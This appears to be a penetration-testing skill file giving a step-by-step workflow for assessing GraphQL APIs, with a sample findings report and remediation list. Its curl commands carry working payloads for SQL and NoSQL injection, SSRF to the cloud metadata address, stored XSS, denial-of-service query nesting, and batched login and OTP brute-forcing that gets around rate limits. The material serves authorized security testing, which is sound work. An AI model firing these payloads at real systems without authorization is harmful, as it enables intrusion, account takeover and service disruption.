---
name: performing-graphql-security-assessment
description: Assessing GraphQL API endpoints for introspection leaks, injection attacks, authorization flaws, and denial-of-service vulnerabilities during authorized security tests.
domain: cybersecurity
subdomain: web-application-security
tags: [penetration-testing, graphql, api-security, owasp, web-security, introspection]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing GraphQL Security Assessment

## When to Use

- During authorized penetration tests when the target application uses a GraphQL API
- When assessing single-page applications (React, Vue, Angular) that communicate via GraphQL
- For evaluating mobile app backends that expose GraphQL endpoints
- When testing microservice architectures with a GraphQL gateway or federation
- During bug bounty programs targeting GraphQL-based APIs

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: With InQL extension for GraphQL scanning
- **GraphQL Voyager**: Schema visualization tool
- **InQL Scanner**: Burp extension for GraphQL introspection and query generation
- **Altair GraphQL Client**: Desktop GraphQL client for interactive testing
- **clairvoyance**: GraphQL schema enumeration when introspection is disabled
- **curl**: For manual GraphQL query submission

## Workflow

### Step 1: Discover and Fingerprint GraphQL Endpoints

Locate GraphQL endpoints and confirm GraphQL is running.

```bash
# Common GraphQL endpoint paths
for path in graphql graphiql playground query gql api/graphql \
  v1/graphql v2/graphql graphql/console; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' \
    "https://target.example.com/$path")
  echo "$path: $status"
done

# Check for GraphQL IDEs (GraphiQL, Playground)
curl -s "https://target.example.com/graphiql" | grep -i "graphiql"
curl -s "https://target.example.com/graphql/playground" | grep -i "playground"

# Fingerprint GraphQL engine
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' \
  "https://target.example.com/graphql"
# Response varies by engine: Apollo returns "Query", Hasura returns "query_root"

# Check for WebSocket GraphQL subscriptions
# ws://target.example.com/graphql (or wss://)
```

### Step 2: Perform Schema Introspection

Extract the full GraphQL schema to understand the API surface.

```bash
# Full introspection query
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } mutationType { fields { name } } queryType { fields { name } } subscriptionType { fields { name } } } }"}' \
  "https://target.example.com/graphql" | jq .

# Comprehensive introspection query
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}' \
  "https://target.example.com/graphql" | jq . > schema.json

# If introspection is disabled, use clairvoyance for schema enumeration
python3 -m clairvoyance \
  -u "https://target.example.com/graphql" \
  -w /usr/share/seclists/Discovery/Web-Content/graphql-field-names.txt \
  -o discovered-schema.json

# Visualize the schema using GraphQL Voyager
# Upload schema.json to https://graphql-kit.com/graphql-voyager/
```

### Step 3: Test Authorization on Queries and Mutations

Verify that access control is enforced at the field and object level.

```bash
# Test querying all users (should require admin)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"{ users { id email role passwordHash } }"}' \
  "https://target.example.com/graphql" | jq .

# Test accessing sensitive fields on own user
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"{ user(id: 1) { id email ssn creditCard internalNotes } }"}' \
  "https://target.example.com/graphql" | jq .

# Test mutation authorization (admin-only actions with user token)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"mutation { deleteUser(id: 2) { success } }"}' \
  "https://target.example.com/graphql" | jq .

curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"query":"mutation { updateUserRole(userId: 1, role: ADMIN) { id role } }"}' \
  "https://target.example.com/graphql" | jq .

# Test without any authentication
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email } }"}' \
  "https://target.example.com/graphql" | jq .
```

### Step 4: Test for Injection Vulnerabilities

Assess GraphQL queries for SQL injection, NoSQL injection, and other injection types.

```bash
# SQL injection in GraphQL arguments
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ user(name: \"admin\\\" OR 1=1--\") { id email } }"}' \
  "https://target.example.com/graphql" | jq .

# NoSQL injection (MongoDB)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users(filter: {email: {$ne: \"\"}}) { id email } }"}' \
  "https://target.example.com/graphql" | jq .

# Test for SSRF via GraphQL
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }"}' \
  "https://target.example.com/graphql" | jq .

# Test for stored XSS via mutations
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { updateProfile(bio: \"<script>alert(1)</script>\") { id bio } }"}' \
  "https://target.example.com/graphql" | jq .

# GraphQL directive injection
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { email @deprecated } }"}' \
  "https://target.example.com/graphql" | jq .
```

### Step 5: Test for Denial of Service Attacks

Assess query complexity limits and resource consumption controls.

```bash
# Deep nesting attack (query depth)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { friends { friends { friends { friends { friends { friends { friends { name } } } } } } } } }"}' \
  "https://target.example.com/graphql" | jq .

# Width attack (requesting many fields)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ u1: user(id:1){email} u2: user(id:2){email} u3: user(id:3){email} u4: user(id:4){email} u5: user(id:5){email} u6: user(id:6){email} u7: user(id:7){email} u8: user(id:8){email} u9: user(id:9){email} u10: user(id:10){email} }"}' \
  "https://target.example.com/graphql" | jq .

# Batch query attack
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '[{"query":"{ user(id:1){email} }"},{"query":"{ user(id:2){email} }"},{"query":"{ user(id:3){email} }"},{"query":"{ user(id:4){email} }"},{"query":"{ user(id:5){email} }"}]' \
  "https://target.example.com/graphql" | jq .

# Fragment-based circular reference
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { ...A } } fragment A on User { friends { ...B } } fragment B on User { friends { ...A } }"}' \
  "https://target.example.com/graphql" | jq .

# Test for unbounded pagination
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users(first: 1000000) { id email } }"}' \
  "https://target.example.com/graphql" | jq '.data.users | length'
```

### Step 6: Test Batching for Authentication Bypass

Use query batching to brute-force credentials or bypass rate limiting.

```bash
# Batch login attempts to bypass rate limiting
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(email:\"admin@target.com\",password:\"password1\"){token}}"},
    {"query":"mutation{login(email:\"admin@target.com\",password:\"password2\"){token}}"},
    {"query":"mutation{login(email:\"admin@target.com\",password:\"password3\"){token}}"},
    {"query":"mutation{login(email:\"admin@target.com\",password:\"admin123\"){token}}"},
    {"query":"mutation{login(email:\"admin@target.com\",password:\"letmein\"){token}}"}
  ]' \
  "https://target.example.com/graphql" | jq .

# Batch OTP verification attempts
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{verifyOTP(code:\"000000\"){success}}"},
    {"query":"mutation{verifyOTP(code:\"000001\"){success}}"},
    {"query":"mutation{verifyOTP(code:\"000002\"){success}}"},
    {"query":"mutation{verifyOTP(code:\"000003\"){success}}"},
    {"query":"mutation{verifyOTP(code:\"000004\"){success}}"}
  ]' \
  "https://target.example.com/graphql" | jq .

# Alias-based batching (same operation, different aliases)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { a1:login(email:\"admin@test.com\",password:\"pass1\"){token} a2:login(email:\"admin@test.com\",password:\"pass2\"){token} a3:login(email:\"admin@test.com\",password:\"pass3\"){token} }"}' \
  "https://target.example.com/graphql" | jq .
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Introspection** | GraphQL feature that exposes the full schema, types, fields, and mutations |
| **Query Depth** | The nesting level of a GraphQL query; deep queries can cause DoS |
| **Query Complexity** | A score calculated from the cost of resolving each field in a query |
| **Batching** | Sending multiple queries in a single HTTP request for parallel execution |
| **Aliases** | GraphQL feature allowing the same field to be queried multiple times with different arguments |
| **Fragments** | Reusable field selections that can cause circular references if not validated |
| **N+1 Problem** | Unoptimized resolvers causing exponential database queries for nested fields |
| **Field-level Authorization** | Access control applied to individual fields rather than entire types |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **InQL (Burp Extension)** | GraphQL introspection scanner and query generator for Burp Suite |
| **GraphQL Voyager** | Interactive schema visualization tool |
| **Altair GraphQL Client** | Desktop GraphQL IDE for crafting and testing queries |
| **clairvoyance** | Schema enumeration when introspection is disabled |
| **graphql-cop** | GraphQL security auditing tool (`pip install graphql-cop`) |
| **BatchQL** | GraphQL batching attack tool for rate limit bypass |

## Common Scenarios

### Scenario 1: Introspection Exposes Internal Schema
Introspection is enabled in production, revealing internal types like `AdminSettings`, `InternalUser`, and mutations like `deleteAllUsers`. This provides a complete roadmap for further attacks.

### Scenario 2: Missing Field-Level Authorization
The `User` type exposes `passwordHash`, `ssn`, and `internalNotes` fields. While the frontend only queries `name` and `email`, any authenticated user can request sensitive fields directly.

### Scenario 3: Batch Login Bypass
The GraphQL endpoint accepts batch queries. By sending 1000 login mutation attempts in a single HTTP request, an attacker bypasses IP-based rate limiting that only counts HTTP requests.

### Scenario 4: Nested Query DoS
A social network API allows querying `friends { friends { friends { ... } } }` up to unlimited depth. A 10-level nested query causes the server to process millions of database queries, resulting in denial of service.

## Output Format

```
## GraphQL Security Assessment Report

**Target**: https://target.example.com/graphql
**Engine**: Apollo Server 4.x
**Assessment Date**: 2024-01-15

### Findings Summary
| Finding | Severity | Status |
|---------|----------|--------|
| Introspection enabled in production | Medium | VULNERABLE |
| Missing field-level authorization | High | VULNERABLE |
| No query depth limit | High | VULNERABLE |
| Batch query rate limit bypass | High | VULNERABLE |
| GraphiQL IDE exposed | Low | VULNERABLE |
| SQL injection in user query | Critical | VULNERABLE |
| CSRF on mutations | Medium | PASS (custom header required) |

### Critical: SQL Injection via user Query
**Location**: `user(name: String)` query argument
**Payload**: `{ user(name: "' OR 1=1--") { id email role } }`
**Impact**: Full database read access via GraphQL interface

### High: Batch Authentication Bypass
**Location**: POST /graphql (array body)
**Payload**: Array of 100 login mutations in single request
**Impact**: Rate limiting bypassed; 100 password attempts per HTTP request

### Recommendation
1. Disable introspection in production environments
2. Implement field-level authorization on all sensitive fields
3. Set query depth limit (max 7-10 levels)
4. Set query complexity limit and cost analysis
5. Disable or rate-limit batch queries
6. Remove GraphiQL/Playground from production
7. Parameterize all database queries in resolvers
```
